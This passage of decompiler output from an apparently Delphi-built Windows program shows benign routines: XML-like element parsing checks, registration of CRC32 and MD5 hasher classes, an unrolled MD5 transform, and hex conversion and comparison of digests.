  unsigned int v9[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v10; // [esp-10h] [ebp-14h]
  int v11; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v11 = 0;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_43745C;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  LOBYTE(a3) = 1;
  if ( a1[11] )
  {
    sub_407AA0(*(_DWORD *)(a1[11] + 8), a2);
    if ( v5 )
    {
      v6 = --a1[10];
      if ( v6 )
        a1[11] = *(_DWORD *)(a1[8] + 4 * v6 - 4);
      else
        a1[11] = 0;
    }
    else
    {
      v8 = *(_DWORD *)(a1[11] + 8);
      sub_4079F0(&v11, 4);
      (*(void (__fastcall **)(_DWORD *, int, _DWORD, int, const wchar_t *, int))*a1)(a1, v11, *a1, v8, L" vs ", a2);
      a3 = 0;
    }
  }
  else
  {
    (*(void (__fastcall **)(_DWORD *, const wchar_t *))*a1)(a1, L"Element not found");
    a3 = 0;
  }
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_437463;
  sub_406C44(&v11);
  return a3;
}
// 4373FE: variable 'v5' is possibly undefined
// 437478: using guessed type wchar_t aElementNotFoun_0[18];
// 4374E4: using guessed type wchar_t aVs[5];

//----- (004374F0) --------------------------------------------------------
int __usercall sub_4374F0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  signed int *v7; // edi
  unsigned int v9; // [esp-2Ch] [ebp-34h]
  _DWORD v10[6]; // [esp-18h] [ebp-20h] BYREF
  int v11; // [esp+0h] [ebp-8h] BYREF
  int v12; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10[5] = a3;
  v10[4] = a5;
  v10[3] = a4;
  v10[2] = &savedregs;
  v10[1] = &loc_437575;
  v10[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v7 = *(signed int **)(a1 + 8);
  if ( v7 && *(_DWORD *)(a1 + 12) )
  {
    sub_415150(*v7, &v12);
    sub_415150(**(_DWORD **)(a1 + 12), &v11);
    v9 = a2;
    sub_4079F0((int *)(a1 + 16), 5);
  }
  else
  {
    sub_406FE8((volatile __int32 *)(a1 + 16), a2);
  }
  __writefsdword(0, v9);
  return sub_406CA4((int)&v11, 2);
}
// 4374F0: could not find valid save-restore pair for ebx
// 4374F0: could not find valid save-restore pair for edi
// 4374F0: could not find valid save-restore pair for esi
// 43755F: variable 'v9' is possibly undefined
// 437598: using guessed type _strings str___14[1];

//----- (004375B0) --------------------------------------------------------
int __usercall sub_4375B0@<eax>(int a1@<eax>, int a2@<ebx>)
{
  LOBYTE(a2) = 1;
  if ( *(_DWORD *)(a1 + 44) )
  {
    (**(void (__fastcall ***)(int, const wchar_t *))a1)(a1, L"Unexpected end of element");
  }
  else
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_DWORD *)(a1 + 12) = 0;
  }
  return a2;
}
// 4375E4: using guessed type wchar_t aUnexpectedEndO_0[26];

//----- (00437620) --------------------------------------------------------
int __fastcall sub_437620(int result, int a2, int a3)
{
  *(_DWORD *)(result + 8) = a2;
  *(_DWORD *)(result + 12) = a3;
  return result;
}

//----- (00437630) --------------------------------------------------------
int __usercall sub_437630@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>)
{
  LOBYTE(a3) = 1;
  if ( *(_DWORD *)(a1 + 44) )
  {
    sub_429E10(*(_DWORD *)(a1 + 44), a2);
  }
  else
  {
    (**(void (__fastcall ***)(int, const wchar_t *))a1)(a1, L"Element not found");
    return 0;
  }
  return a3;
}
// 437664: using guessed type wchar_t aElementNotFoun_1[18];

//----- (00437690) --------------------------------------------------------
int __fastcall sub_437690(int a1)
{
  int v2; // eax
  int v3; // eax
  int v4; // esi

  v2 = *(_DWORD *)(a1 + 36);
  if ( v2 <= 64 )
  {
    if ( v2 <= 8 )
      v3 = 4;
    else
      v3 = 16;
  }
  else
  {
    v3 = v2 >> 2;
  }
  v4 = v3 + *(_DWORD *)(a1 + 40);
  *(_DWORD *)(a1 + 36) = v4;
  return System::__linkproc__ DynArraySetLength(v4);
}
// 4376A1: conditional instruction was optimized away because eax.4>=41
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (004376E0) --------------------------------------------------------
int __fastcall sub_4376E0(_DWORD *a1, int a2)
{
  int v4; // esi
  int result; // eax

  v4 = a1[10];
  if ( v4 >= a1[9] )
    sub_437690((int)a1);
  a1[11] = a2;
  result = a1[8];
  *(_DWORD *)(result + 4 * v4) = a2;
  a1[10] = v4 + 1;
  return result;
}

//----- (00437710) --------------------------------------------------------
int __fastcall sub_437710(int a1, int a2)
{
  wchar_t **v3; // ebx
  char v4; // zf

  v3 = &off_466C10;
  do
  {
    sub_407AA0((int)*v3, a2);
    if ( v4 )
      break;
    v3 += 2;
  }
  while ( *((_WORD *)v3 + 2) );
  return *((unsigned __int16 *)v3 + 2);
}
// 437725: variable 'v4' is possibly undefined
// 466C10: using guessed type wchar_t *off_466C10;

//----- (00437740) --------------------------------------------------------
_WORD *__fastcall sub_437740(_DWORD *a1, __int16 a2, int a3)
{
  _WORD *result; // eax

  if ( a1[1] < ++*a1 )
    sub_437770(a1, a2, a3);
  result = (_WORD *)a1[2];
  *result = a2;
  a1[2] += 2;
  return result;
}

//----- (00437770) --------------------------------------------------------
int __fastcall sub_437770(_DWORD *a1, int a2, int a3)
{
  int v4; // eax
  int result; // eax

  v4 = 2 * *a1;
  a1[1] = v4;
  sub_407890(a1 + 3, v4, a3);
  a1[2] = sub_407790(a1[3]);
  result = 2 * (*a1 - 1);
  a1[2] += result;
  return result;
}

//----- (004377A0) --------------------------------------------------------
int __fastcall sub_4377A0(_DWORD *a1)
{
  int result; // eax

  *a1 = 0;
  result = sub_407790(a1[3]);
  a1[2] = result;
  return result;
}

//----- (004377C0) --------------------------------------------------------
int __fastcall sub_4377C0(_DWORD *a1)
{
  int result; // eax

  a1[1] = 0;
  sub_406C44(a1 + 3);
  *a1 = 0;
  result = sub_407790(a1[3]);
  a1[2] = result;
  return result;
}

//----- (00438600) --------------------------------------------------------
int __fastcall sub_438600(int a1)
{
  int v1; // ebx
  unsigned int v3[2]; // [esp-18h] [ebp-2Ch] BYREF
  int *v4; // [esp-10h] [ebp-24h]
  unsigned int v5[6]; // [esp-Ch] [ebp-20h] BYREF
  _DWORD *v6; // [esp+Ch] [ebp-8h]
  char v7; // [esp+13h] [ebp-1h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v7 = 1;
  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_43866E;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v6 = (_DWORD *)sub_405568(a1, 1);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_438659;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  v1 = 3;
  do
  {
    (*(void (__fastcall **)(_DWORD *))(*v6 + 12))(v6);
    --v1;
  }
  while ( v1 );
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_438660;
  sub_405598(v6);
  __writefsdword(0, v5[0]);
  return 1;
}

//----- (004386C0) --------------------------------------------------------
_DWORD *sub_4386C0()
{
  _DWORD *v0; // ebx
  _DWORD *v1; // ebx
  _DWORD *v2; // ebx
  _DWORD *v3; // ebx
  _DWORD *v4; // ebx

  v0 = *(_DWORD **)(Sysinit::__linkproc__ GetTls() + 24);
  *(_DWORD *)(Sysinit::__linkproc__ GetTls() + 24) = 0;
  sub_405598(v0);
  v1 = *(_DWORD **)(Sysinit::__linkproc__ GetTls() + 28);
  *(_DWORD *)(Sysinit::__linkproc__ GetTls() + 28) = 0;
  sub_405598(v1);
  v2 = *(_DWORD **)(Sysinit::__linkproc__ GetTls() + 32);
  *(_DWORD *)(Sysinit::__linkproc__ GetTls() + 32) = 0;
  sub_405598(v2);
  v3 = *(_DWORD **)(Sysinit::__linkproc__ GetTls() + 36);
  *(_DWORD *)(Sysinit::__linkproc__ GetTls() + 36) = 0;
  sub_405598(v3);
  v4 = *(_DWORD **)(Sysinit::__linkproc__ GetTls() + 40);
  *(_DWORD *)(Sysinit::__linkproc__ GetTls() + 40) = 0;
  return sub_405598(v4);
}

//----- (00438770) --------------------------------------------------------
int __fastcall sub_438770(int a1)
{
  int result; // eax
  int v3; // eax
  int v4; // ebx

  result = sub_438600(a1);
  if ( (_BYTE)result )
  {
    v3 = dword_4673A0;
    if ( dword_4673A0 )
      v3 = *(_DWORD *)(dword_4673A0 - 4);
    v4 = v3;
    System::__linkproc__ DynArraySetLength(v3 + 1);
    dword_46739C = a1;
    result = dword_4673A0;
    *(_DWORD *)(dword_4673A0 + 4 * v4) = a1;
  }
  return result;
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 46739C: using guessed type int dword_46739C;
// 4673A0: using guessed type int dword_4673A0;

//----- (004387D0) --------------------------------------------------------
int __usercall sub_4387D0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int result; // eax
  int v4; // edx
  int v5; // eax
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  result = sub_438770((int)cls_HasherUtil_TCRC32SoftHasher);
  if ( !dword_46739C )
  {
    LOBYTE(v4) = 1;
    v5 = unknown_libname_85(off_411F40, v4, L"CRC32 hasher not found");
    return sub_406340(v5, a1, (int)&savedregs, a2, a3);
  }
  return result;
}
// 4387F2: variable 'v4' is possibly undefined
// 411F40: using guessed type int (*off_411F40[2])();
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 438344: using guessed type int (*cls_HasherUtil_TCRC32SoftHasher[2])();
// 43880C: using guessed type wchar_t aCrc32HasherNot[23];
// 46739C: using guessed type int dword_46739C;

//----- (00438840) --------------------------------------------------------
int __fastcall sub_438840(int a1)
{
  int result; // eax
  int v3; // eax
  int v4; // ebx

  result = sub_438600(a1);
  if ( (_BYTE)result )
  {
    v3 = dword_4673A8;
    if ( dword_4673A8 )
      v3 = *(_DWORD *)(dword_4673A8 - 4);
    v4 = v3;
    System::__linkproc__ DynArraySetLength(v3 + 1);
    dword_4673A4 = a1;
    result = dword_4673A8;
    *(_DWORD *)(dword_4673A8 + 4 * v4) = a1;
  }
  return result;
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 4673A4: using guessed type int dword_4673A4;
// 4673A8: using guessed type int dword_4673A8;

//----- (004388A0) --------------------------------------------------------
int __usercall sub_4388A0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int result; // eax
  int v4; // edx
  int v5; // eax
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  sub_438840((int)&cls_HasherUtil_TMD5SoftHasher);
  if ( (unsigned __int8)sub_439720(&dword_4673F8, (int)&off_438924, 0) && dword_467400 == 16 )
    sub_438840((int)cls_HasherUtil_TMD5BCryptHasher);
  result = sub_439720(dword_467404, (int)&off_438924, 32);
  if ( (_BYTE)result && dword_46740C == 16 )
    result = sub_438840((int)cls_HasherUtil_TMD5BCryptReusableHasher);
  if ( !dword_4673A4 )
  {
    LOBYTE(v4) = 1;
    v5 = unknown_libname_85(off_411F40, v4, &off_438938);
    return sub_406340(v5, a1, (int)&savedregs, a2, a3);
  }
  return result;
}
// 438915: variable 'v4' is possibly undefined
// 411F40: using guessed type int (*off_411F40[2])();
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 438404: using guessed type int (*cls_HasherUtil_TMD5SoftHasher)();
// 4384C4: using guessed type int (*cls_HasherUtil_TMD5BCryptHasher[2])();
// 438584: using guessed type int (*cls_HasherUtil_TMD5BCryptReusableHasher[2])();
// 438924: using guessed type void *off_438924;
// 438938: using guessed type void *off_438938;
// 4673A4: using guessed type int dword_4673A4;
// 4673F8: using guessed type int dword_4673F8;
// 467400: using guessed type int dword_467400;
// 467404: using guessed type _DWORD dword_467404[2];
// 46740C: using guessed type int dword_46740C;

//----- (00438970) --------------------------------------------------------
int __usercall sub_438970@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  if ( !dword_46739C )
    sub_4387D0(a1, a2, a3);
  return sub_405568(dword_46739C, 1);
}
// 46739C: using guessed type int dword_46739C;

//----- (00438990) --------------------------------------------------------
int __usercall sub_438990@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int result; // eax
  int *v4; // [esp-4h] [ebp-4h]

  result = *(_DWORD *)(Sysinit::__linkproc__ GetTls() + 28);
  if ( !result )
  {
    v4 = (int *)(Sysinit::__linkproc__ GetTls() + 28);
    *v4 = sub_4389D0(a1, a2, a3);
    return *(_DWORD *)(Sysinit::__linkproc__ GetTls() + 28);
  }
  return result;
}

//----- (004389D0) --------------------------------------------------------
int __usercall sub_4389D0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // eax

  v3 = dword_4673A4;
  if ( !dword_4673A4 )
  {
    sub_4388A0(a1, a2, a3);
    v3 = dword_4673A4;
  }
  return sub_405568(v3, 1);
}
// 4673A4: using guessed type int dword_4673A4;

//----- (004389F0) --------------------------------------------------------
int __fastcall sub_4389F0(_DWORD *a1, _DWORD *a2)
{
  int v4; // ebx
  int v5; // ecx
  int v6; // edx
  int v7; // eax
  int v8; // edx
  int v9; // ecx
  int v10; // ebx
  int v11; // eax
  int v12; // edx
  int v13; // ecx
  int v14; // ebx
  int v15; // eax
  int v16; // edx
  int v17; // ecx
  int v18; // ebx
  int v19; // eax
  int v20; // edx
  int v21; // ecx
  int v22; // ebx
  int v23; // eax
  int v24; // edx
  int v25; // ecx
  int v26; // ebx
  int v27; // eax
  int v28; // edx
  int v29; // ecx
  int v30; // ebx
  int v31; // eax
  int v32; // edx
  int v33; // ecx
  int v34; // ebx
  int v35; // eax
  int v36; // edx
  int v37; // ecx
  int v38; // ebx
  int v39; // eax
  int v40; // edx
  int v41; // ecx
  int v42; // ebx
  int v43; // eax
  int v44; // edx
  int v45; // ecx
  int v46; // ebx
  int v47; // eax
  int v48; // edx
  int v49; // ecx
  int v50; // ebx
  int v51; // eax
  int v52; // edx
  int v53; // ecx
  int v54; // ebx
  int v55; // eax
  int v56; // edx
  int v57; // ecx
  int v58; // ebx
  int v59; // eax
  int v60; // edx
  int v61; // ecx
  int v62; // ebx
  int v63; // eax
  int v64; // edx
  int v65; // ecx
  int v66; // ebx
  int result; // eax
  int v68; // edx
  int v69; // ecx
  int v70; // ebx

  do
  {
    v4 = a1[2];
    v5 = a1[3];
    v6 = a1[4];
    v7 = v4 + __ROL4__((v6 ^ v4 & (v6 ^ v5)) + *a2 + a1[1] - 680876936, 7);
    v8 = v7 + __ROL4__((v5 ^ v7 & (v5 ^ v4)) + a2[1] + v6 - 389564586, 12);
    v9 = v8 + __ROL4__((v4 ^ v8 & (v4 ^ v7)) + a2[2] + v5 + 606105819, 17);
    v10 = v9 + __ROL4__((v7 ^ v9 & (v7 ^ v8)) + a2[3] + v4 - 1044525330, 22);
    v11 = v10 + __ROL4__((v8 ^ v10 & (v8 ^ v9)) + a2[4] + v7 - 176418897, 7);
    v12 = v11 + __ROL4__((v9 ^ v11 & (v9 ^ v10)) + a2[5] + v8 + 1200080426, 12);
    v13 = v12 + __ROL4__((v10 ^ v12 & (v10 ^ v11)) + a2[6] + v9 - 1473231341, 17);
    v14 = v13 + __ROL4__((v11 ^ v13 & (v11 ^ v12)) + a2[7] + v10 - 45705983, 22);
    v15 = v14 + __ROL4__((v12 ^ v14 & (v12 ^ v13)) + a2[8] + v11 + 1770035416, 7);
    v16 = v15 + __ROL4__((v13 ^ v15 & (v13 ^ v14)) + a2[9] + v12 - 1958414417, 12);
    v17 = v16 + __ROL4__((v14 ^ v16 & (v14 ^ v15)) + a2[10] + v13 - 42063, 17);
    v18 = v17 + __ROL4__((v15 ^ v17 & (v15 ^ v16)) + a2[11] + v14 - 1990404162, 22);
    v19 = v18 + __ROL4__((v16 ^ v18 & (v16 ^ v17)) + a2[12] + v15 + 1804603682, 7);
    v20 = v19 + __ROL4__((v17 ^ v19 & (v17 ^ v18)) + a2[13] + v16 - 40341101, 12);
    v21 = v20 + __ROL4__((v18 ^ v20 & (v18 ^ v19)) + a2[14] + v17 - 1502002290, 17);
    v22 = v21 + __ROL4__((v19 ^ v21 & (v19 ^ v20)) + a2[15] + v18 + 1236535329, 22);
    v23 = v22 + __ROL4__((v21 ^ v20 & (v21 ^ v22)) + a2[1] + v19 - 165796510, 5);
    v24 = v23 + __ROL4__((v22 ^ v21 & (v22 ^ v23)) + a2[6] + v20 - 1069501632, 9);
    v25 = v24 + __ROL4__((v23 ^ v22 & (v23 ^ v24)) + a2[11] + v21 + 643717713, 14);
    v26 = v25 + __ROL4__((v24 ^ v23 & (v24 ^ v25)) + *a2 + v22 - 373897302, 20);
    v27 = v26 + __ROL4__((v25 ^ v24 & (v25 ^ v26)) + a2[5] + v23 - 701558691, 5);
    v28 = v27 + __ROL4__((v26 ^ v25 & (v26 ^ v27)) + a2[10] + v24 + 38016083, 9);
    v29 = v28 + __ROL4__((v27 ^ v26 & (v27 ^ v28)) + a2[15] + v25 - 660478335, 14);
    v30 = v29 + __ROL4__((v28 ^ v27 & (v28 ^ v29)) + a2[4] + v26 - 405537848, 20);
    v31 = v30 + __ROL4__((v29 ^ v28 & (v29 ^ v30)) + a2[9] + v27 + 568446438, 5);
    v32 = v31 + __ROL4__((v30 ^ v29 & (v30 ^ v31)) + a2[14] + v28 - 1019803690, 9);
    v33 = v32 + __ROL4__((v31 ^ v30 & (v31 ^ v32)) + a2[3] + v29 - 187363961, 14);
    v34 = v33 + __ROL4__((v32 ^ v31 & (v32 ^ v33)) + a2[8] + v30 + 1163531501, 20);
    v35 = v34 + __ROL4__((v33 ^ v32 & (v33 ^ v34)) + a2[13] + v31 - 1444681467, 5);
    v36 = v35 + __ROL4__((v34 ^ v33 & (v34 ^ v35)) + a2[2] + v32 - 51403784, 9);
    v37 = v36 + __ROL4__((v35 ^ v34 & (v35 ^ v36)) + a2[7] + v33 + 1735328473, 14);
    v38 = v37 + __ROL4__((v36 ^ v35 & (v36 ^ v37)) + a2[12] + v34 - 1926607734, 20);
    v39 = v38 + __ROL4__((v38 ^ v36 ^ v37) + a2[5] + v35 - 378558, 4);
    v40 = v39 + __ROL4__((v39 ^ v37 ^ v38) + a2[8] + v36 - 2022574463, 11);
    v41 = v40 + __ROL4__((v40 ^ v38 ^ v39) + a2[11] + v37 + 1839030562, 16);
    v42 = v41 + __ROL4__((v41 ^ v39 ^ v40) + a2[14] + v38 - 35309556, 23);
    v43 = v42 + __ROL4__((v42 ^ v40 ^ v41) + a2[1] + v39 - 1530992060, 4);
    v44 = v43 + __ROL4__((v43 ^ v41 ^ v42) + a2[4] + v40 + 1272893353, 11);
    v45 = v44 + __ROL4__((v44 ^ v42 ^ v43) + a2[7] + v41 - 155497632, 16);
    v46 = v45 + __ROL4__((v45 ^ v43 ^ v44) + a2[10] + v42 - 1094730640, 23);
    v47 = v46 + __ROL4__((v46 ^ v44 ^ v45) + a2[13] + v43 + 681279174, 4);
    v48 = v47 + __ROL4__((v47 ^ v45 ^ v46) + *a2 + v44 - 358537222, 11);
    v49 = v48 + __ROL4__((v48 ^ v46 ^ v47) + a2[3] + v45 - 722521979, 16);
    v50 = v49 + __ROL4__((v49 ^ v47 ^ v48) + a2[6] + v46 + 76029189, 23);
    v51 = v50 + __ROL4__((v50 ^ v48 ^ v49) + a2[9] + v47 - 640364487, 4);
    v52 = v51 + __ROL4__((v51 ^ v49 ^ v50) + a2[12] + v48 - 421815835, 11);
    v53 = v52 + __ROL4__((v52 ^ v50 ^ v51) + a2[15] + v49 + 530742520, 16);
    v54 = v53 + __ROL4__((v53 ^ v51 ^ v52) + a2[2] + v50 - 995338651, 23);
    v55 = v54 + __ROL4__((v53 ^ (v54 | ~v52)) + *a2 + v51 - 198630844, 6);
    v56 = v55 + __ROL4__((v54 ^ (v55 | ~v53)) + a2[7] + v52 + 1126891415, 10);
    v57 = v56 + __ROL4__((v55 ^ (v56 | ~v54)) + a2[14] + v53 - 1416354905, 15);
    v58 = v57 + __ROL4__((v56 ^ (v57 | ~v55)) + a2[5] + v54 - 57434055, 21);
    v59 = v58 + __ROL4__((v57 ^ (v58 | ~v56)) + a2[12] + v55 + 1700485571, 6);
    v60 = v59 + __ROL4__((v58 ^ (v59 | ~v57)) + a2[3] + v56 - 1894986606, 10);
    v61 = v60 + __ROL4__((v59 ^ (v60 | ~v58)) + a2[10] + v57 - 1051523, 15);
    v62 = v61 + __ROL4__((v60 ^ (v61 | ~v59)) + a2[1] + v58 - 2054922799, 21);
    v63 = v62 + __ROL4__((v61 ^ (v62 | ~v60)) + a2[8] + v59 + 1873313359, 6);
    v64 = v63 + __ROL4__((v62 ^ (v63 | ~v61)) + a2[15] + v60 - 30611744, 10);
    v65 = v64 + __ROL4__((v63 ^ (v64 | ~v62)) + a2[6] + v61 - 1560198380, 15);
    v66 = v65 + __ROL4__((v64 ^ (v65 | ~v63)) + a2[13] + v62 + 1309151649, 21);
    result = v66 + __ROL4__((v65 ^ (v66 | ~v64)) + a2[4] + v63 - 145523070, 6);
    v68 = result + __ROL4__((v66 ^ (result | ~v65)) + a2[11] + v64 - 1120210379, 10);
    v69 = v68 + __ROL4__((result ^ (v68 | ~v66)) + a2[2] + v65 + 718787259, 15);
    v70 = v69 + __ROL4__((v68 ^ (v69 | ~result)) + a2[9] + v66 - 343485551, 21);
    a1[1] += result;
    a1[2] += v70;
    a1[3] += v69;
    a1[4] += v68;
    a2 += 16;
  }
  while ( (_DWORD *)*a1 != a2 );
  return result;
}

//----- (00438FC0) --------------------------------------------------------
char __fastcall sub_438FC0(_BYTE *a1, int a2)
{
  int v3; // ebx
  int v4; // eax
  unsigned __int16 *v6; // esi

  v3 = 4;
  v4 = a2;
  if ( a2 )
    v4 = *(_DWORD *)(a2 - 4);
  if ( v4 != 8 )
    return 0;
  v6 = (unsigned __int16 *)(sub_407790(a2) + 16);
  do
  {
    v6 -= 2;
    if ( sub_424290(v6, a1, 1) != 1 )
      return 0;
    ++a1;
    --v3;
  }
  while ( v3 > 0 );
  return 1;
}

//----- (00439030) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_439030@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<esi>)
{
  int v5; // esi
  int v6; // ebx
  unsigned int v8[2]; // [esp-20h] [ebp-2Ch] BYREF
  void **v9; // [esp-18h] [ebp-24h]
  _DWORD v10[5]; // [esp-14h] [ebp-20h] BYREF
  void *v11; // [esp+0h] [ebp-Ch] BYREF
  volatile __int32 *v12; // [esp+4h] [ebp-8h]
  int v13; // [esp+8h] [ebp-4h] BYREF
  void *savedregs; // [esp+Ch] [ebp+0h] BYREF

  v13 = 0;
  v11 = 0;
  v10[4] = a3;
  v10[3] = a4;
  v12 = a2;
  v10[2] = &savedregs;
  v10[1] = &loc_4390D6;
  v10[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_4390B1;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v5 = 4;
  sub_406C44(&v13);
  v6 = a1 + 4;
  do
  {
    sub_4154B0(*(unsigned __int8 *)--v6, 2, (int *)&v11);
    sub_407910(&v13, v11);
    --v5;
  }
  while ( v5 > 0 );
  sub_406FE8(v12, v13);
  __writefsdword(0, v8[0]);
  v9 = (void **)&loc_4390B8;
  sub_406C44(&v13);
  __writefsdword(0, (unsigned int)v12);
  savedregs = &loc_4390DD;
  sub_406C44(&v11);
  return sub_406C44(&v13);
}
// 439030: could not find valid save-restore pair for ebx
// 439030: could not find valid save-restore pair for esi
// 4390C8: bad sp value at call
// 4390D0: bad sp value at call

//----- (004390F0) --------------------------------------------------------
char __fastcall sub_4390F0(_BYTE *a1, int a2)
{
  int v3; // ebx
  int v4; // eax
  unsigned __int16 *v6; // esi

  v3 = 16;
  v4 = a2;
  if ( a2 )
    v4 = *(_DWORD *)(a2 - 4);
  if ( v4 != 32 )
    return 0;
  v6 = (unsigned __int16 *)sub_407790(a2);
  do
  {
    if ( sub_424290(v6, a1, 1) != 1 )
      return 0;
    v6 += 2;
    ++a1;
    --v3;
  }
  while ( v3 > 0 );
  return 1;
}

//----- (00439160) --------------------------------------------------------
bool __fastcall sub_439160(int *a1, int a2)
{
  int v3; // eax

  v3 = *a1;
  return a1[1] == *(_DWORD *)(a2 + 4) && v3 == *(_DWORD *)a2 && *((_QWORD *)a1 + 1) == *(_QWORD *)(a2 + 8);
}

//----- (00439190) --------------------------------------------------------
_DWORD *__fastcall sub_439190(_DWORD *result)
{
  *result = 0;
  result[1] = 0;
  result[2] = 0;
  result[3] = 0;
  return result;
}

//----- (004391B0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_4391B0@<eax>(unsigned __int8 *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<esi>)
{
  int v5; // esi
  unsigned int v7[2]; // [esp-20h] [ebp-2Ch] BYREF
  void **v8; // [esp-18h] [ebp-24h]
  _DWORD v9[5]; // [esp-14h] [ebp-20h] BYREF
  void *v10; // [esp+0h] [ebp-Ch] BYREF
  volatile __int32 *v11; // [esp+4h] [ebp-8h]
  int v12; // [esp+8h] [ebp-4h] BYREF
  void *savedregs; // [esp+Ch] [ebp+0h] BYREF

  v12 = 0;
  v10 = 0;
  v9[4] = a3;
  v9[3] = a4;
  v11 = a2;
  v9[2] = &savedregs;
  v9[1] = &loc_439254;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_43922F;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v5 = 16;
  sub_406C44(&v12);
  do
  {
    sub_4154B0(*a1, 2, (int *)&v10);
    sub_407910(&v12, v10);
    ++a1;
    --v5;
  }
  while ( v5 > 0 );
  sub_406FE8(v11, v12);
  __writefsdword(0, v7[0]);
  v8 = (void **)&loc_439236;
  sub_406C44(&v12);
  __writefsdword(0, (unsigned int)v11);
  savedregs = &loc_43925B;
  sub_406C44(&v10);
  return sub_406C44(&v12);
}
// 4391B0: could not find valid save-restore pair for ebx
// 4391B0: could not find valid save-restore pair for esi
// 439246: bad sp value at call
// 43924E: bad sp value at call

//----- (00439270) --------------------------------------------------------
char __fastcall sub_439270(_BYTE *a1, int a2)
{
  int v3; // ebx
  int v4; // eax
  unsigned __int16 *v6; // esi

  v3 = 20;
  v4 = a2;
  if ( a2 )
    v4 = *(_DWORD *)(a2 - 4);
  if ( v4 != 40 )
    return 0;
  v6 = (unsigned __int16 *)sub_407790(a2);
  do
  {
    if ( sub_424290(v6, a1, 1) != 1 )
      return 0;
    v6 += 2;
    ++a1;
    --v3;
  }
  while ( v3 > 0 );
  return 1;
}

//----- (004392E0) --------------------------------------------------------
bool __fastcall sub_4392E0(int *a1, _DWORD *a2)
{
  int v3; // eax

  v3 = *a1;
  return a1[1] == a2[1] && v3 == *a2 && a1[3] == a2[3] && a1[2] == a2[2] && a1[4] == a2[4];
}

//----- (00439320) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_439320@<eax>(unsigned __int8 *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<esi>)
{
  int v5; // esi
  unsigned int v7[2]; // [esp-20h] [ebp-2Ch] BYREF
  void **v8; // [esp-18h] [ebp-24h]
  _DWORD v9[5]; // [esp-14h] [ebp-20h] BYREF
  void *v10; // [esp+0h] [ebp-Ch] BYREF
  volatile __int32 *v11; // [esp+4h] [ebp-8h]
  int v12; // [esp+8h] [ebp-4h] BYREF
  void *savedregs; // [esp+Ch] [ebp+0h] BYREF

  v12 = 0;
  v10 = 0;
  v9[4] = a3;
  v9[3] = a4;
  v11 = a2;
  v9[2] = &savedregs;
  v9[1] = &loc_4393C4;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_43939F;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v5 = 20;
  sub_406C44(&v12);
  do
  {
    sub_4154B0(*a1, 2, (int *)&v10);
    sub_407910(&v12, v10);
    ++a1;
    --v5;
  }
  while ( v5 > 0 );
  sub_406FE8(v11, v12);
  __writefsdword(0, v7[0]);
  v8 = (void **)&loc_4393A6;
  sub_406C44(&v12);
  __writefsdword(0, (unsigned int)v11);
  savedregs = &loc_4393CB;
  sub_406C44(&v10);
  return sub_406C44(&v12);
}
// 439320: could not find valid save-restore pair for ebx
// 439320: could not find valid save-restore pair for esi
// 4393B6: bad sp value at call
// 4393BE: bad sp value at call

//----- (004393E0) --------------------------------------------------------
char __fastcall sub_4393E0(_BYTE *a1, int a2)
{
  int v3; // ebx
  int v4; // eax
  unsigned __int16 *v6; // esi

  v3 = 32;
  v4 = a2;
  if ( a2 )
